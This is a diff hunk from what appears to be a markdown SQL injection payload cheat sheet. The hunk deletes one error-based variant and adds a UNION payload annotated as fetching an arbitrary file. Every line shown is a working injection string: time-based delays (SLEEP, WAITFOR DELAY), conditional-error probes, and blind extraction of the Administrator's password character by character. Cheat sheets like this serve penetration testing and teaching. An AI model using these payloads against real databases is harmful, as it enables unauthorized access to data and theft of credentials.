@@ -31,9 +31,10 @@ asd</script>') UNION SELECT 1,SLEEP(10),3,4,5-- - >> Via file upload vulnerabili
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'--
 
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 
 '; IF (1=1) WAITFOR DELAY '0:0:10'--
+
+-1337 union select "main.py" >> To fetch arbitrary file.
 
 ```
 ### Determinig SQLi Vulnerablity & Login Bypass
